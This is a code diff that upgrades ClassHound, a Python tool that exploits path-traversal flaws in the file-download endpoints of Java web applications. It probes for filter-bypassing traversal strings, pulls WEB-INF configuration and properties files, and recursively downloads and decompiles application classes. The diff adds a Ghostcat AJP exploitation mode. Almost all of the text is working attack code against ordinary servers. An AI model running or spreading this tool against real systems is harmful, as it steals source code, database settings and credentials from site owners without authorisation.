@@ -2,100 +2,90 @@
 # coding: utf-8
 # Build By LandGrey
 
-import os
 import io
 import re
-import sys
 import time
 import urllib3
 import requests
 import argparse
 import subprocess
+from thirdparty.lib import *
+from thirdparty.ghostcat import *
+
 from bs4 import BeautifulSoup
 from requests.adapters import HTTPAdapter
 
+
 try:
     from urllib import quote
-    from urlparse import urlparse
     reload(sys)
     sys.setdefaultencoding('utf8')
-    urllib3.disable_warnings()
 except ImportError:
     from urllib.request import quote
-    from urllib.request import urlparse
+finally:
+    urllib3.disable_warnings()
+
+
+session = requests.Session()
+session.mount('http://', HTTPAdapter(max_retries=2))
+session.mount('https://', HTTPAdapter(max_retries=2))
+
+
+def change_travel_path(travel_file_path):
+    global url, post_data
+
+    _data = travel_char * travel_char_count + travel_file_path
+    raw_file_path = delimiter + normal_path + delimiter
+    if raw_post_data:
+        post_data = raw_post_data.replace(raw_file_path, _data)
+    else:
+        url = raw_url.replace(raw_file_path, _data)
 
 
 def request():
-    global url, sleep_time, post_data, headers
     if sleep_time > 0:
         time.sleep(sleep_time)
     try:
         if not post_data:
-            r = session.get(url, headers=headers, verify=False, timeout=30, allow_redirects=True)
+            r = session.get(url, headers=headers, verify=False, timeout=15, allow_redirects=True)
         else:
-            r = session.post(url, headers=headers, data=post_data, verify=False, timeout=30, allow_redirects=True)
+            r = session.post(url, headers=headers, data=post_data, verify=False, timeout=15, allow_redirects=True)
         return r.status_code, r.content
     except requests.exceptions.ConnectionError as e:
-        exit("[-] Request ConnectionError!")
+        print("[-] Request ConnectionError!")
 
 
-def change_url_data(data):
-    global url, post_data, delimiter, normal_path
+def download_and_save(travel_file_path, auto_change_count=False):
+    global travel_char_count
 
-    raw_file_path = delimiter + normal_path + delimiter
-    if raw_post_data:
-        post_data = raw_post_data.replace(raw_file_path, data)
-    else:
-        url = raw_url.replace(raw_file_path, data)
-
-
-def change_travel_path(travel_file_path):
-    global travel_char, travel_char_count
-
-    change_url_data(travel_char * travel_char_count + travel_file_path)
-
-
-def save_file(save_dir, file_name, content):
-    # if file content is mess, you can play with it
-    # content = content[4:-4]
-    if content:
-        file_name = file_name.replace('\\', '/').lstrip('/')
-        dirs = file_name.split('/')[:-1]
-        cur_dir = os.path.join(save_dir, "/".join(dirs))
-        if not os.path.exists(cur_dir):
-            os.makedirs(cur_dir)
-        with open(os.path.join(cur_dir, file_name.split('/')[-1]), 'wb') as f:
-            f.write(content)
-
-
-def walk_file_paths(directory):
-    file_paths = []
-    for root_path, subdir_name, file_names in os.walk(directory):
-        file_paths.extend([os.path.abspath(os.path.join(root_path, _)) for _ in file_names])
-    return file_paths
-
-
-def download_and_save_file(travel_file_path, auto_change_count=False):
-    global normal_status_code, travel_char_count
     travel_file_path = travel_file_path.lstrip('/')
-
     pre_count = travel_char_count
     success = False
 
-    change_travel_path(travel_file_path)
-    _status_code, _content = request()
-
-    if _content and _status_code == normal_status_code and keyword not in str(_content):
-        try:
-            save_file(own_dir, travel_file_path, _content)
-            sys.stdout.write('\r[+] Download: [{}] ok{}'.format(travel_file_path, ' ' * 10))
-            success = True
-            travel_char_count = pre_count
-        except Exception as e:
-            sys.stdout.write('\r[-] Download: [{}] failed'.format(travel_file_path))
+    if use_vulnerability == "ghostcat":
+        success = True
+        _content = exploit_ajp(url, ajp_port, travel_file_path, method='GET' if not post_data else 'POST', headers=headers)
+        if keyword not in str(_content):
+            sys.stdout.write('\r[+] Download [{}] ok !'.format(travel_file_path))
+            save_file(workspace, travel_file_path, _content)
+        else:
+            sys.stdout.write('\r[-] Download [{}] failed'.format(travel_file_path))
+        sys.stdout.flush()
     else:
-        sys.stdout.write('\r[-] Download: [{}] failed'.format(travel_file_path))
-    sys.stdout.flush()
+        change_travel_path(travel_file_path)
+        _status_code, _content = request()
+
+        if _content and _status_code == normal_status_code and keyword not in str(_content):
+            try:
+                save_file(workspace, travel_file_path, _content)
+                sys.stdout.write('\r[+] Download [{}] ok{}'.format(travel_file_path, ' ' * 10))
+                success = True
+                travel_char_count = pre_count
+            except Exception as e:
+                sys.stdout.write('\r[-] Download [{}] failed'.format(travel_file_path))
+        else:
+            sys.stdout.write('\r[-] Download [{}] failed'.format(travel_file_path))
+        sys.stdout.flush()
 
     # 没下载成功并使用 --auto 时
     if auto_change_count and not success:
@@ -105,49 +95,27 @@ def download_and_save_file(travel_file_path, auto_change_count=False):
             travel_char_count = r
             change_travel_path(travel_file_path)
             _status_code, _content = request()
-            if _content and _status_code == normal_status_code and keyword not in _content:
+            if _content and _status_code == normal_status_code and keyword not in str(_content):
                 try:
-                    save_file(own_dir, travel_file_path, _content)
-                    sys.stdout.write('\r[+] Download: [{}] ok !'.format(travel_file_path))
+                    save_file(workspace, travel_file_path, _content)
+                    sys.stdout.write('\r[+] Download [{}] ok !'.format(travel_file_path))
                     travel_char_count = r
                     break
                 except Exception as e:
-                    sys.stdout.write('\r[-] Download: [{}] failed !'.format(travel_file_path))
+                    sys.stdout.write('\r[-] Download [{}] failed !'.format(travel_file_path))
             else:
-                sys.stdout.write('\r[-] Download: [{}] failed !'.format(travel_file_path))
+                sys.stdout.write('\r[-] Download [{}] failed !'.format(travel_file_path))
             sys.stdout.flush()
 
 
-def decompile_and_download_class(class_path):
-    command = 'java -jar {} {}'.format(os.path.join(current_dir, 'thirdparty', 'cfr-0.145.jar'), class_path)
-    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    stdout, stderr = process.communicate()
-    # 保存反编译的 class 文件
-    save_file(own_dir, fp.replace('classes', 'java').replace('.class', '.java'), stdout)
-    match = re.findall('import (.*?);', stdout.decode('utf-8'), re.I | re.M | re.S)
-    if match:
-        for m in match:
-            _class_url_path = base_path + 'WEB-INF/classes/' + m.strip().replace(".", "/") + '.class'
-            _allow_download = True
-            for x in do_not_download_classes:
-                if x in _class_url_path:
-                    _allow_download = False
-            if _allow_download and _class_url_path not in already_download_class_url_list:
-                download_and_save_file(_class_url_path)
-                already_download_class_url_list.append(_class_url_path)
-
-
-def file_path_extract(value):
-    values = []
-    if ":" in value:
-        for v in value.split(','):
-            values.append(v.split(":")[-1])
-    else:
-        if ";" in value:
-            values.extend(value.split(";"))
-        else:
-            values.extend(value.split())
-    return values
+def disk_path_to_url_dir_path(disk_path):
+    """
+    :param disk_path:
+    :return: /WEB-INF/config', '/WEB-INF/config/cache-context.xml
+    """
+    url_path = os.path.abspath(disk_path)[len(os.path.abspath(workspace)):].replace('\\', '/')
+    url_dir = os.path.split(url_path)[0]
+    return url_dir, url_path
 
 
 def parse_xml_get_xml_url(xml_path):
@@ -194,18 +162,28 @@ def match_and_download_xml(path):
     for xml_url in xml_urls:
         for extension in do_download_extensions_from_xml:
             if xml_url.endswith(extension):
-                download_and_save_file(xml_url)
+                download_and_save(xml_url)
                 break
 
 
-def disk_path_to_url_dir_path(disk_path):
-    """
-    :param disk_path:
-    :return: /WEB-INF/config', '/WEB-INF/config/cache-context.xml
-    """
-    url_path = os.path.abspath(disk_path)[len(os.path.abspath(own_dir)):].replace('\\', '/')
-    url_dir = os.path.split(url_path)[0]
-    return url_dir, url_path
+def decompile_and_download_class(class_path):
+    command = ['java', '-jar', '{}'.format(os.path.join(current_folder, 'thirdparty', 'cfr-0.145.jar')), class_path]
+    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    stdout, stderr = process.communicate()
+    # 保存反编译的 class 文件
+    relative_java_path = class_path.replace(workspace, '').replace('classes', 'java').replace('.class', '.java').lstrip('/')
+    save_file(workspace, relative_java_path, stdout)
+    match = re.findall('import (.*?);', stdout.decode('utf-8'), re.I | re.M | re.S)
+    if match:
+        for m in match:
+            _class_url_path = base_path + 'WEB-INF/classes/' + m.strip().replace(".", "/") + '.class'
+            _allow_download = True
+            for x in do_not_download_classes:
+                if x in _class_url_path:
+                    _allow_download = False
+            if _allow_download and _class_url_path not in already_download_class_url_list:
+                download_and_save(_class_url_path)
+                already_download_class_url_list.append(_class_url_path)
 
 
 if __name__ == '__main__':
@@ -215,26 +193,21 @@ if __name__ == '__main__':
                   ,,,,,     o' \,=./ `o    |.===.    
                  /(o o)\       (o o)       {}o o{}   
               ooO--(_)--OooooO--(_)--OooooO--(_)--Ooo        
-                                                            ClassHound v1.1\n
+                                                            ClassHound v2.0\n
 ''')
     try:
-        current_dir = os.path.dirname(os.path.join(os.path.abspath(sys.argv[0]))).encode('utf-8').decode()
-    except UnicodeError:
+        current_folder = os.path.dirname(os.path.join(os.path.abspath(sys.argv[0]))).encode('utf-8').decode()
+    except UnicodeError as e:
         try:
-            current_dir = os.path.dirname(os.path.abspath(sys.argv[0])).decode('utf-8')
-        except UnicodeError:
-            current_dir = "."
-            exit('[*] Please play this script in ascii path')
+            current_folder = os.path.dirname(os.path.abspath(sys.argv[0])).decode('utf-8')
+        except UnicodeError as e:
+            current_folder = "."
+            exit('[*] Please play script in ascii string path')
 
-    headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0',
-        'Connection': 'Keep-Alive',
-        'Content-Type': 'application/x-www-form-urlencoded',
-    }
-
+    # arguments init
     parser = argparse.ArgumentParser()
     parser.add_argument('-u', '--url', dest='raw_url', default='', help='Full download url, file path must surrounded with delimiter char.\nSuch as: http://127.0.0.1/download.jsp?path=images/#1.png#')
-    parser.add_argument('-k', '--keyword', dest='keyword', default='page not found', help='404 page keyword')
+    parser.add_argument('-k', '--keyword', dest='keyword', default=None, help='404 page keyword')
     parser.add_argument('-p', '--post', dest='raw_post_data', default='', help='POST data, file path must surrounded with delimiter char')
     parser.add_argument('-f', '--file', dest='url_file', default='', help='specify need download file url path list')
     parser.add_argument('-a', '--auto', dest='auto_change', default=False, action='store_true', help='auto detect and change travel char count when use -f options')
@@ -246,6 +219,8 @@ if __name__ == '__main__':
     parser.add_argument('-hh', '--http-header', dest='http_header', default='', help='Add http request header, format: "Referer:http://127.0.0.1,admin:true"')
     parser.add_argument('-hp', '--http-proxy', dest='http_proxy', default=None, help='set http/https proxy')
     parser.add_argument('-mc', '--max-count', dest='max_count', default=8, type=int, help='max try travel char count, default: 10')
+    parser.add_argument('-vul', '--vulnerability', dest='vulnerability', choices=['ghostcat'], default='', help='use other vulnerability to download file.\nSuch as: ghostcat')
+    parser.add_argument('--ajp-port', dest='ajp_port', default=8009, type=int, help='ghostcat vulnerability ajp port, default: 8009')
 
     if len(sys.argv) == 1:
         sys.argv.append('-h')
@@ -264,116 +239,29 @@ if __name__ == '__main__':
     delimiter = args.delimiter_char
     raw_post_data = args.raw_post_data
     travel_char_count = args.travel_char_count
+    use_vulnerability = args.vulnerability
+    ajp_port = args.ajp_port
 
+    # variable declare
     url = raw_url
     post_data = raw_post_data
+    init_travel_files_with_prefix = []
 
     already_append_xml_disk_path_list = []
     not_parsed_disk_xml_path_list = []
 
-    not_decompile_disk_class_path_list = []
     already_download_class_url_list = []
     already_download_class_disk_path_list = []
+    not_decompile_disk_class_path_list = []
 
-    do_download_extensions_from_xml = [
-        '.xml',
-        '.yml',
-        '.yaml',
-        '.factories',
-        '.properties',
-        '.cfg',
-        '.conf',
-        '.config',
-        '.ini',
-        '.json',
-    ]
-    do_not_download_classes = [
-        '/qiniu/',
-        '/javax/',
-        '/qcloud/',
-        '/hudson/',
-        '/javafx/',
-        '/jenkins/',
-        '/kohsuke/',
-        '/netscape/',
-        '/jenkinsci/',
-        '/freemarker/',
+    workspace = get_workspace(raw_url)
 
-        '/java/io/',
-        '/java/sql/',
-        '/java/nio/',
-        '/java/net/',
-        '/java/awt/',
-        '/java/rmi/',
-        '/java/math/',
-        '/java/time/',
-        '/java/mail/',
-        '/java/util/',
-        '/java/lang/',
-        '/java/text/',
-        '/java/beans/',
-        '/java/applet/',
-        '/java/security/',
-
-        '/cn/alanx/',
-        '/cn/chinadoi/',
-
-        '/net/sf/',
-        '/net/coobird/',
-        '/net/sourceforge/',
-
-        '/sun/net/',
-
-        '/ch/qos/',
-        '/jxl/write/',
-        '/jcifs/http/',
-        '/de/innosystec/',
-
-        '/org/jcp/',
-        '/org/omg/',
-        '/org/w3c/',
-        '/org/xml/',
-        '/org/json/',
-        '/org/jdom/',
-        '/org/jasig',
-        '/org/slf4j/',
-        '/org/dom4j/',
-        '/org/jfree/',
-        '/org/tuckey/',
-        '/org/quartz/',
-        '/org/apache/',
-        '/org/mybatis/',
-        '/org/hibernate/',
-        '/org/htmlparser/',
-        '/org/aopalliance/',
-        '/org/logicalcobwebs/',
-        '/org/springframework/',
-
-        '/com/sun/',
-        '/com/octo/',
-        '/com/jacob/',
-        '/com/fredck/'
-        '/com/oracle/',
-        '/com/google/',
-        '/com/alipay/',
-        '/com/aliyun/',
-        '/com/alibaba/',
-        '/com/tencent/',
-        '/com/mchange/'
-        '/com/aliyuncs/',
-        '/com/baidubce/',
-        '/com/microsoft/',
-    ]
-
-    hostname = urlparse(raw_url).hostname
-    own_dir = os.path.join(current_dir, hostname)
-    if not os.path.exists(own_dir):
-        os.makedirs(own_dir)
-
-    session = requests.Session()
     session.proxies = {'http': http_proxy, 'https': http_proxy}
-    session.mount('http://', HTTPAdapter(max_retries=3))
-    session.mount('https://', HTTPAdapter(max_retries=3))
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0',
+        'Connection': 'Keep-Alive',
+        'Content-Type': 'application/x-www-form-urlencoded',
+    }
 
     # 设置额外 HTTP headers
     if http_header:
@@ -382,6 +270,10 @@ if __name__ == '__main__':
             if header:
                 kv = header.split(":")
                 headers.update({kv[0].strip(): kv[-1].strip()})
+
+    for x in init_travel_files_without_prefix:
+        init_travel_files_with_prefix.append((base_path if base_path != "/" else "") + x)
+
     try:
         if raw_post_data:
             normal_path = re.findall(delimiter + '(.*?)' + delimiter, post_data)[0]
@@ -393,153 +285,85 @@ if __name__ == '__main__':
             exit('Invalid delimiter char {}, please changed!'.format(delimiter))
     except IndexError:
         normal_path = "fake path"
-        exit('Cannot match valid file path in the middle of "{0} {0}"'.format(delimiter))
-    # 获得正常下载请求的状态码和内容
-    normal_status_code, normal_content = request()
-    # 没指定遍历字符时自动探测遍历字符
-    if not travel_char:
-        travel_char = '../'
-        # 正常文件名倒数第二位插入 ./ 探测目标是否会替换 ./ 为空字符
-        change_url_data(normal_path[:-1] + './' + normal_path[-1])
-        char_status_code, char_content = request()
-        # 被替换
-        if char_status_code == normal_status_code and char_content == normal_content:
-            travel_char = '...//'
-            # 正常文件名倒数第二位插入 ../ 探测目标是否会替换 ../ 为空字符
-            change_url_data(normal_path[:-1] + '../' + normal_path[-1])
+        if not use_vulnerability:
+            exit('Cannot match valid file path in the middle of "{0} {0}"'.format(delimiter))
+
+    if use_vulnerability == 'ghostcat':
+        if keyword is None:
+            try:
+                keyword = str(exploit_ajp(url, ajp_port, get_random_string(suffix=".jsp"), method='GET' if not post_data else 'POST', headers=headers))
+            except Exception as e:
+                keyword = "page not found"
+        for _tf in init_travel_files_without_prefix:
+            _xml_content = exploit_ajp(url, ajp_port, _tf, method='GET' if not post_data else 'POST', headers=headers)
+            if keyword not in str(_xml_content):
+                save_file(workspace, _tf, _xml_content)
+                sys.stdout.write('\r[+] Download [{}] ok !'.format(_tf))
+                sys.stdout.flush()
+    else:
+        if keyword is None:
+            keyword = "page not found"
+        # 获得正常下载请求的状态码和内容
+        normal_status_code, normal_content = request()
+        # 没指定遍历字符时自动探测遍历字符
+        if not travel_char:
+            travel_char = '../'
+            # 正常文件名倒数第二位插入 ./ 探测目标是否会替换 ./ 为空字符
+            change_travel_path(normal_path[:-1] + './' + normal_path[-1])
             char_status_code, char_content = request()
             # 被替换
             if char_status_code == normal_status_code and char_content == normal_content:
-                travel_char = '.....///'
-        else:
-            # 正常文件名倒数第二位插入 ../ 探测目标是否会替换 ../ 为空字符
-            change_url_data(normal_path[:-1] + '../' + normal_path[-1])
-            char_status_code, char_content = request()
-            # 被替换
-            if char_status_code == normal_status_code and char_content == normal_content:
-                travel_char = '....//'
+                travel_char = '...//'
+                # 正常文件名倒数第二位插入 ../ 探测目标是否会替换 ../ 为空字符
+                change_travel_path(normal_path[:-1] + '../' + normal_path[-1])
+                char_status_code, char_content = request()
+                # 被替换
+                if char_status_code == normal_status_code and char_content == normal_content:
+                    travel_char = '.....///'
+            else:
+                # 正常文件名倒数第二位插入 ../ 探测目标是否会替换 ../ 为空字符
+                change_travel_path(normal_path[:-1] + '../' + normal_path[-1])
+                char_status_code, char_content = request()
+                # 被替换
+                if char_status_code == normal_status_code and char_content == normal_content:
+                    travel_char = '....//'
 
-    # 首次尝试下载的文件
-    init_travel_files_without_prefix = [
-        # WEB-INF 直系目录 xml
-        'WEB-INF/web.xml',
-        'WEB-INF/spring.xml',
-        'WEB-INF/config.xml',
-        'WEB-INF/spring-mvc.xml',
-        'WEB-INF/springMVC-mvc.xml',
-        'WEB-INF/spring-config.xml',
-        'WEB-INF/struts-config.xml',
-        'WEB-INF/mybatis-config.xml',
-        'WEB-INF/spring-resource.xml',
-        'WEB-INF/applicationContext.xml',
-
-        # WEB-INF/classes 目录 xml
-        'WEB-INF/classes/web.xml',
-        'WEB-INF/classes/spring.xml',
-        'WEB-INF/classes/config.xml',
-        'WEB-INF/classes/springmvc.xml',
-        'WEB-INF/classes/spring-mvc.xml',
-        'WEB-INF/classes/springMVC-mvc.xml',
-        'WEB-INF/classes/spring-config.xml',
-        'WEB-INF/classes/spring-service.xml',
-        'WEB-INF/classes/struts-config.xml',
-        'WEB-INF/classes/mybatis-config.xml',
-        'WEB-INF/classes/spring-resource.xml',
-        'WEB-INF/classes/applicationContext.xml',
-
-        # WEB-INF 其他目录 xml
-        'WEB-INF/classes/spring/spring.xml',
-        'WEB-INF/classes/spring/springmvc.xml',
-        'WEB-INF/classes/spring/spring-dao.xml',
-        'WEB-INF/classes/spring/spring-web.xml',
-        'WEB-INF/classes/spring/spring-mvc.xml',
-        'WEB-INF/classes/spring/spring-config.xml',
-        'WEB-INF/classes/spring/spring-service.xml',
-        'WEB-INF/classes/spring/spring-resource.xml',
-        'WEB-INF/classes/mybatis/mybatis-config.xml',
-
-        # WEB-INF 直系目录 properties
-        'WEB-INF/db.properties',
-        'WEB-INF/app.properties',
-        'WEB-INF/jdbc.properties',
-        'WEB-INF/config.properties',
-        'WEB-INF/spring.properties',
-        'WEB-INF/database.properties',
-        'WEB-INF/properties.properties',
-        'WEB-INF/application.properties',
-
-        # WEB-INF/classes 目录 properties
-        'WEB-INF/classes/db.properties',
-        'WEB-INF/classes/app.properties',
-        'WEB-INF/classes/jdbc.properties',
-        'WEB-INF/classes/config.properties',
-        'WEB-INF/classes/spring.properties',
-        'WEB-INF/classes/database.properties',
-        'WEB-INF/classes/properties.properties',
-        'WEB-INF/classes/application.properties',
-
-        # WEB-INF/config 目录 properties
-        'WEB-INF/config/db.properties',
-        'WEB-INF/config/app.properties',
-        'WEB-INF/config/jdbc.properties',
-        'WEB-INF/config/config.properties',
-        'WEB-INF/config/spring.properties',
-        'WEB-INF/config/database.properties',
-        'WEB-INF/config/properties.properties',
-        'WEB-INF/config/application.properties',
-
-        # WEB-INF/properties 目录 properties
-        'WEB-INF/properties/db.properties',
-        'WEB-INF/properties/app.properties',
-        'WEB-INF/properties/jdbc.properties',
-        'WEB-INF/properties/config.properties',
-        'WEB-INF/properties/spring.properties',
-        'WEB-INF/properties/database.properties',
-        'WEB-INF/properties/properties.properties',
-        'WEB-INF/properties/application.properties',
-
-        # WEB-INF 其他目录 properties
-        'WEB-INF/classes/META-INF/properties/database.properties',
-    ]
-
-    init_travel_files_with_prefix = []
-    for x in init_travel_files_without_prefix:
-        init_travel_files_with_prefix.append((base_path if base_path != "/" else "") + x)
-
-    for travel_file in init_travel_files_with_prefix:
-        # 手动指定遍历字符数量不再自动探测
-        if travel_char_count != -1:
-            change_url_data(travel_char * travel_char_count + travel_file)
-            try_status_code, try_content = request()
-            if try_content and try_status_code == normal_status_code and keyword not in str(try_content):
-                save_file(own_dir, travel_file, try_content)
-                print('\r[+] Download: [{}] success!  Travel Char: [{}]  Count: [{}]'.format(travel_file, travel_char, travel_char_count))
-        else:
-            for x in range(1, max_count + 1):
-                change_url_data(travel_char * x + travel_file)
+        # 首先尝试下载内置的配置文件列表
+        for _tf in init_travel_files_with_prefix:
+            # 手动指定遍历字符数量不再自动探测
+            if travel_char_count != -1:
+                change_travel_path(travel_char * travel_char_count + _tf)
                 try_status_code, try_content = request()
                 if try_content and try_status_code == normal_status_code and keyword not in str(try_content):
-                    travel_char_count = x if travel_char_count == 0 else travel_char_count
-                    save_file(own_dir, travel_file, try_content)
-                    print('\r[+] Download: [{}] success!  Travel Char: [{}]  Count: [{}]'.format(travel_file, travel_char, travel_char_count))
-                    break
+                    save_file(workspace, _tf, try_content)
+                    print('\r[+] Travel Char: [{}] Count: [{}]. Success download: [{}]'.format(travel_char, travel_char_count, _tf))
+            else:
+                for x in range(1, max_count + 1):
+                    change_travel_path(travel_char * x + _tf)
+                    try_status_code, try_content = request()
+                    if try_content and try_status_code == normal_status_code and keyword not in str(try_content):
+                        travel_char_count = x if travel_char_count == 0 else travel_char_count
+                        save_file(workspace, _tf, try_content)
+                        print('\r[+] Travel Char: [{}] Count: [{}]. Success download: [{}]'.format(travel_char, travel_char_count, _tf))
+                        break
+
     try:
         # 指定了额外的下载文件列表
         if download_path:
-            print("[+] Starting download from [{}] file ...".format(download_path))
+            print("[+] Download from [{}] file ...".format(download_path))
             if os.path.isfile(download_path):
                 with io.open(download_path, 'r', encoding="utf-8") as f:
                     for line in f.readlines():
                         if line.strip():
-                            download_and_save_file(line.strip(), auto_change_count=True)
+                            download_and_save(line.strip(), auto_change_count=True)
             else:
                 exit("[-] File [{}] not exists".format(download_path))
         else:
-            print("\r[+] Starting download [.xml] files ...")
+            print("\r[+] Download [*.xml] files by prepared files list ...")
             # 循环解析下载 xml 文件
             continue_xml_parse_and_download = True
             while True and continue_xml_parse_and_download:
-                for fp in walk_file_paths(own_dir):
+                for fp in walk_file_paths(workspace):
                     # 首先更新未解析 xml 路径列表
                     if fp in not_parsed_disk_xml_path_list:
                         not_parsed_disk_xml_path_list.remove(fp)
@@ -554,10 +378,10 @@ if __name__ == '__main__':
                 if not not_parsed_disk_xml_path_list:
                     continue_xml_parse_and_download = False
 
-            print("\r[+] Starting download [.class] files parsing from [.xml] files ...")
+            print("\r[+] Download [*.class] files parsing from [*.xml] files ...")
             # 粗粒度提取 xml 文件中 class 地址并尝试下载到本地
             class_pattern = '<.*?class>(.*?)</.*?class>|class="(.*?)"|classname="(.*?)"|type="(.*?)"|resource="(.*?)"'
-            for fp in walk_file_paths(own_dir):
+            for fp in walk_file_paths(workspace):
                 if fp.endswith('.xml'):
                     try:
                         m = re.findall(class_pattern, io.open(fp, 'r', encoding="utf-8").read(), re.I | re.M | re.S)
@@ -577,14 +401,14 @@ if __name__ == '__main__':
                                 if ('/' + class_path_uri).startswith(x):
                                     allow_download = False
                             if allow_download and class_url_path not in already_download_class_url_list:
-                                download_and_save_file(class_url_path)
+                                download_and_save(class_url_path)
                                 already_download_class_url_list.append(class_url_path)
 
-            print("\r[+] Starting download [.class] files decompile from [.class] files ...")
+            print("\r[+] Download [*.class] files by decompiled [*.class] files ...")
             # 循环反编译 class 文件并下载到本地
             continue_class_parse_and_download = True
             while True and continue_class_parse_and_download:
-                for fp in walk_file_paths(own_dir):
+                for fp in walk_file_paths(workspace):
                     if fp in not_decompile_disk_class_path_list:
                         not_decompile_disk_class_path_list.remove(fp)
                     if fp.endswith('.class') and fp not in already_download_class_disk_path_list:
@@ -596,9 +420,11 @@ if __name__ == '__main__':
                     continue_class_parse_and_download = False
     except KeyboardInterrupt:
         print("\n[*] User press CTR+C !")
+
     # 统计下最终下载的文件类型和数量
     fs = {}
-    for fp in walk_file_paths(own_dir):
+    description = ""
+    for fp in walk_file_paths(workspace):
         fn = os.path.split(fp)[-1]
         if len(fn.split(".")) == 2:
             if fn.split(".")[-1]:
@@ -611,7 +437,6 @@ if __name__ == '__main__':
                 fs['other'] += 1
             else:
                 fs['other'] = 1
-    desc = ""
     for k, v in fs.items():
-        desc += "\n[+] Download   {:10}  files : {}".format(k, v)
-    print("\n\r[+] All cost   {:10}  seconds{}\n[+] result in: {}".format(str(time.time() - start_time)[:6], desc, own_dir))
+        description += "\n[+] Download   {:10}  files : {}".format(k, v)
+    print("\n\r[+] All cost   {:10}  seconds{}\n[+] result in: {}".format(str(time.time() - start_time)[:6], description, workspace))
